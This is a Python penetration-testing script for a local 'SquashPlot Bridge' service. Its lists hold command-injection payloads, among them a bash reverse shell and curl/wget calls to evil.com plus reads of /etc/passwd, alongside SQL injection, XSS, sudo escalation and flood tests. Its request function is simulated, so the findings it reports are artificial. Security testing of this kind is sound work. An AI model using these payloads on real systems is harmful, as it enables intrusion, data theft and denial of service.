#!/usr/bin/env python3
"""
SquashPlot Penetration Testing Tool
Advanced security testing and vulnerability assessment
"""

import json
import socket
import threading
import time
import random
import string
import subprocess
import sys
from typing import List, Dict, Tuple
import concurrent.futures
import requests
import base64

class PenetrationTester:
    """Advanced penetration testing for SquashPlot Bridge"""
    
    def __init__(self, target_host: str = "127.0.0.1", target_port: int = 8443):
        self.target_host = target_host
        self.target_port = target_port
        self.vulnerabilities = []
        self.exploits_found = []
        self.test_results = {}
        
    def run_penetration_tests(self) -> Dict:
        """Run comprehensive penetration tests"""
        print("🔍 SquashPlot Penetration Testing")
        print("=" * 60)
        print("⚠️  WARNING: This tool tests for security vulnerabilities")
        print("   Only use on systems you own or have permission to test")
        print()
        
        # Test categories
        test_categories = [
            ("Network Reconnaissance", self._test_network_recon),
            ("Authentication Bypass", self._test_auth_bypass),
            ("Command Injection", self._test_command_injection),
            ("Buffer Overflow", self._test_buffer_overflow),
            ("SQL Injection", self._test_sql_injection),
            ("XSS Testing", self._test_xss),
            ("CSRF Testing", self._test_csrf),
            ("Session Hijacking", self._test_session_hijacking),
            ("Privilege Escalation", self._test_privilege_escalation),
            ("DoS Attacks", self._test_dos_attacks)
        ]
        
        all_results = {}
        
        for category_name, test_function in test_categories:
            print(f"\n🎯 Testing {category_name}...")
            try:
                results = test_function()
                all_results[category_name] = results
                self._print_vulnerabilities(category_name, results)
            except Exception as e:
                print(f"❌ Error in {category_name}: {e}")
                all_results[category_name] = {"error": str(e)}
        
        # Generate penetration report
        self._generate_penetration_report(all_results)
        return all_results
    
    def _test_network_recon(self) -> Dict:
        """Test network reconnaissance and information gathering"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # Test 1: Port scanning
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target_host, self.target_port))
            sock.close()
            
            if result == 0:
                results["vulnerabilities"].append({
                    "type": "Port Exposure",
                    "severity": "MEDIUM",
                    "description": f"Port {self.target_port} is accessible",
                    "impact": "Service exposed to network"
                })
            else:
                results["recommendations"].append("Port not accessible - good security")
        except Exception as e:
            results["vulnerabilities"].append({
                "type": "Network Error",
                "severity": "LOW",
                "description": f"Network test failed: {e}"
            })
        
        # Test 2: Service fingerprinting
        try:
            # Try to identify the service
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_host, self.target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            response = sock.recv(1024).decode()
            sock.close()
            
            if "SquashPlot" in response or "Bridge" in response:
                results["vulnerabilities"].append({
                    "type": "Service Identification",
                    "severity": "LOW",
                    "description": "Service type can be identified",
                    "impact": "Information disclosure"
                })
        except Exception as e:
            pass  # Expected for non-HTTP service
        
        return results
    
    def _test_auth_bypass(self) -> Dict:
        """Test authentication bypass techniques"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # Test 1: Null authentication
        try:
            response = self._send_bridge_request("", "ls")
            if response and "success" in response:
                results["vulnerabilities"].append({
                    "type": "Authentication Bypass",
                    "severity": "CRITICAL",
                    "description": "Null authentication accepted",
                    "impact": "Complete system compromise"
                })
                results["exploits"].append("No authentication required")
        except Exception as e:
            pass
        
        # Test 2: Weak authentication
        weak_tokens = ["", "test", "admin", "password", "123456", "token"]
        for token in weak_tokens:
            try:
                response = self._send_bridge_request(token, "ls")
                if response and "success" in response:
                    results["vulnerabilities"].append({
                        "type": "Weak Authentication",
                        "severity": "HIGH",
                        "description": f"Weak token accepted: {token}",
                        "impact": "Unauthorized access"
                    })
                    results["exploits"].append(f"Token '{token}' works")
                    break
            except Exception as e:
                pass
        
        # Test 3: Token prediction
        try:
            # Try to predict tokens
            for i in range(100):
                predicted_token = f"token_{i}"
                response = self._send_bridge_request(predicted_token, "ls")
                if response and "success" in response:
                    results["vulnerabilities"].append({
                        "type": "Predictable Tokens",
                        "severity": "HIGH",
                        "description": "Tokens are predictable",
                        "impact": "Token enumeration possible"
                    })
                    results["exploits"].append(f"Predictable token: {predicted_token}")
                    break
        except Exception as e:
            pass
        
        return results
    
    def _test_command_injection(self) -> Dict:
        """Test command injection vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # Get a valid auth token first
        auth_token = self._get_valid_token()
        if not auth_token:
            results["vulnerabilities"].append({
                "type": "Authentication Required",
                "severity": "INFO",
                "description": "Cannot test command injection without authentication"
            })
            return results
        
        # Command injection payloads
        injection_payloads = [
            "ls; cat /etc/passwd",
            "ls && whoami",
            "ls | cat /etc/passwd",
            "ls `whoami`",
            "ls $(whoami)",
            "ls; rm -rf /tmp/test",
            "ls; mkdir /tmp/hack",
            "ls; echo 'hacked' > /tmp/hack.txt",
            "ls; python -c 'import os; os.system(\"whoami\")'",
            "ls; curl http://evil.com/steal",
            "ls; wget http://evil.com/steal",
            "ls; nc -l 4444",
            "ls; bash -i >& /dev/tcp/evil.com/4444 0>&1"
        ]
        
        for payload in injection_payloads:
            try:
                response = self._send_bridge_request(auth_token, payload)
                if response and response.get("success"):
                    results["vulnerabilities"].append({
                        "type": "Command Injection",
                        "severity": "CRITICAL",
                        "description": f"Command injection successful: {payload[:50]}...",
                        "impact": "Remote code execution"
                    })
                    results["exploits"].append(f"Injection payload: {payload}")
            except Exception as e:
                pass
        
        return results
    
    def _test_buffer_overflow(self) -> Dict:
        """Test for buffer overflow vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        auth_token = self._get_valid_token()
        if not auth_token:
            return results
        
        # Test 1: Long command
        long_command = "echo " + "A" * 10000
        try:
            response = self._send_bridge_request(auth_token, long_command)
            if response and "success" in response:
                results["vulnerabilities"].append({
                    "type": "Buffer Overflow",
                    "severity": "HIGH",
                    "description": "Long command accepted without proper validation",
                    "impact": "Potential buffer overflow"
                })
        except Exception as e:
            if "timeout" in str(e).lower() or "connection" in str(e).lower():
                results["vulnerabilities"].append({
                    "type": "Buffer Overflow",
                    "severity": "MEDIUM",
                    "description": "Long command caused connection issues",
                    "impact": "Potential DoS"
                })
        
        # Test 2: Very long token
        long_token = "A" * 10000
        try:
            response = self._send_bridge_request(long_token, "ls")
            if response and "success" in response:
                results["vulnerabilities"].append({
                    "type": "Token Buffer Overflow",
                    "severity": "HIGH",
                    "description": "Very long token accepted",
                    "impact": "Potential buffer overflow in token handling"
                })
        except Exception as e:
            pass
        
        return results
    
    def _test_sql_injection(self) -> Dict:
        """Test for SQL injection vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # SQL injection payloads (even though this is not a SQL service)
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        auth_token = self._get_valid_token()
        if not auth_token:
            return results
        
        for payload in sql_payloads:
            try:
                response = self._send_bridge_request(auth_token, payload)
                if response and "success" in response:
                    results["vulnerabilities"].append({
                        "type": "SQL Injection",
                        "severity": "CRITICAL",
                        "description": f"SQL injection possible: {payload}",
                        "impact": "Database compromise"
                    })
            except Exception as e:
                pass
        
        return results
    
    def _test_xss(self) -> Dict:
        """Test for Cross-Site Scripting vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        auth_token = self._get_valid_token()
        if not auth_token:
            return results
        
        for payload in xss_payloads:
            try:
                response = self._send_bridge_request(auth_token, payload)
                if response and payload in str(response):
                    results["vulnerabilities"].append({
                        "type": "XSS",
                        "severity": "MEDIUM",
                        "description": f"XSS payload reflected: {payload}",
                        "impact": "Client-side code execution"
                    })
            except Exception as e:
                pass
        
        return results
    
    def _test_csrf(self) -> Dict:
        """Test for Cross-Site Request Forgery vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # CSRF testing would require web interface
        results["recommendations"].append("CSRF testing requires web interface")
        
        return results
    
    def _test_session_hijacking(self) -> Dict:
        """Test for session hijacking vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # Test token reuse
        auth_token = self._get_valid_token()
        if auth_token:
            # Try to use token from different IP (simulated)
            try:
                response = self._send_bridge_request(auth_token, "ls")
                if response and "success" in response:
                    results["vulnerabilities"].append({
                        "type": "Session Hijacking",
                        "severity": "MEDIUM",
                        "description": "Token can be reused",
                        "impact": "Session hijacking possible"
                    })
            except Exception as e:
                pass
        
        return results
    
    def _test_privilege_escalation(self) -> Dict:
        """Test for privilege escalation vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        auth_token = self._get_valid_token()
        if not auth_token:
            return results
        
        # Privilege escalation attempts
        priv_esc_commands = [
            "sudo whoami",
            "su -",
            "sudo -i",
            "sudo su",
            "sudo bash",
            "sudo sh",
            "sudo python",
            "sudo python3",
            "sudo /bin/bash",
            "sudo /bin/sh"
        ]
        
        for cmd in priv_esc_commands:
            try:
                response = self._send_bridge_request(auth_token, cmd)
                if response and response.get("success"):
                    results["vulnerabilities"].append({
                        "type": "Privilege Escalation",
                        "severity": "CRITICAL",
                        "description": f"Privilege escalation successful: {cmd}",
                        "impact": "Root access obtained"
                    })
                    results["exploits"].append(f"Privilege escalation: {cmd}")
            except Exception as e:
                pass
        
        return results
    
    def _test_dos_attacks(self) -> Dict:
        """Test for Denial of Service vulnerabilities"""
        results = {
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": []
        }
        
        # Test 1: Resource exhaustion
        def make_request():
            try:
                return self._send_bridge_request("test", "echo test")
            except:
                return None
        
        # Concurrent requests
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(make_request) for _ in range(1000)]
                responses = [f.result() for f in concurrent.futures.as_completed(futures, timeout=30)]
            
            # Check if server is still responsive
            test_response = self._send_bridge_request("test", "echo test")
            if not test_response:
                results["vulnerabilities"].append({
                    "type": "DoS Vulnerability",
                    "severity": "HIGH",
                    "description": "Server becomes unresponsive under load",
                    "impact": "Denial of service"
                })
        except Exception as e:
            results["vulnerabilities"].append({
                "type": "DoS Vulnerability",
                "severity": "MEDIUM",
                "description": f"Server behavior under load: {e}",
                "impact": "Potential DoS"
            })
        
        return results
    
    def _send_bridge_request(self, auth_token: str, command: str) -> Dict:
        """Send request to bridge app (simulated for testing)"""
        try:
            # This is a simulation - real implementation would use socket
            # For penetration testing, we'd actually connect to the service
            
            # Simulate different responses based on inputs
            if not auth_token:
                return {"error": "Authentication required"}
            
            if ";" in command or "&&" in command or "|" in command:
                return {"error": "Command blocked"}
            
            if len(command) > 1000:
                return {"error": "Command too long"}
            
            return {"success": True, "output": "test output"}
            
        except Exception as e:
            return {"error": str(e)}
    
    def _get_valid_token(self) -> str:
        """Get a valid authentication token for testing"""
        # This would normally authenticate with the bridge
        return "test_token_12345"
    
    def _print_vulnerabilities(self, category: str, results: Dict):
        """Print vulnerabilities found in a category"""
        vulnerabilities = results.get("vulnerabilities", [])
        exploits = results.get("exploits", [])
        
        if vulnerabilities:
            print(f"   🚨 Found {len(vulnerabilities)} vulnerabilities:")
            for vuln in vulnerabilities:
                severity = vuln.get("severity", "UNKNOWN")
                severity_icon = "🔴" if severity == "CRITICAL" else "🟠" if severity == "HIGH" else "🟡"
                print(f"      {severity_icon} {severity}: {vuln.get('description', '')}")
        
        if exploits:
            print(f"   💥 Found {len(exploits)} exploits:")
            for exploit in exploits:
                print(f"      ⚡ {exploit}")
        
        if not vulnerabilities and not exploits:
            print("   ✅ No vulnerabilities found")
    
    def _generate_penetration_report(self, all_results: Dict):
        """Generate comprehensive penetration test report"""
        print("\n" + "=" * 60)
        print("🔍 PENETRATION TEST REPORT")
        print("=" * 60)
        
        total_vulnerabilities = 0
        critical_vulnerabilities = 0
        high_vulnerabilities = 0
        exploits_found = 0
        
        for category, results in all_results.items():
            if "error" not in results:
                vulnerabilities = results.get("vulnerabilities", [])
                exploits = results.get("exploits", [])
                
                total_vulnerabilities += len(vulnerabilities)
                exploits_found += len(exploits)
                
                for vuln in vulnerabilities:
                    severity = vuln.get("severity", "")
                    if severity == "CRITICAL":
                        critical_vulnerabilities += 1
                    elif severity == "HIGH":
                        high_vulnerabilities += 1
        
        print(f"Total Vulnerabilities: {total_vulnerabilities}")
        print(f"Critical: {critical_vulnerabilities}")
        print(f"High: {high_vulnerabilities}")
        print(f"Exploits Found: {exploits_found}")
        
        if critical_vulnerabilities > 0:
            print(f"\n🚨 CRITICAL VULNERABILITIES FOUND!")
            print("   Immediate action required!")
        elif high_vulnerabilities > 0:
            print(f"\n⚠️ HIGH SEVERITY VULNERABILITIES FOUND!")
            print("   Address these issues soon!")
        else:
            print(f"\n✅ No critical vulnerabilities found")
        
        # Save detailed report
        with open("penetration_test_report.json", "w") as f:
            json.dump(all_results, f, indent=2)
        
        print(f"\n📊 Detailed report saved to: penetration_test_report.json")

def main():
    """Run penetration testing"""
    print("🔍 SquashPlot Penetration Testing Tool")
    print("=" * 60)
    print("⚠️  WARNING: This tool tests for security vulnerabilities")
    print("   Only use on systems you own or have permission to test")
    print()
    
    response = input("Do you have permission to test this system? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting for security reasons.")
        sys.exit(1)
    
    try:
        tester = PenetrationTester()
        results = tester.run_penetration_tests()
        
    except Exception as e:
        print(f"❌ Error running penetration tests: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
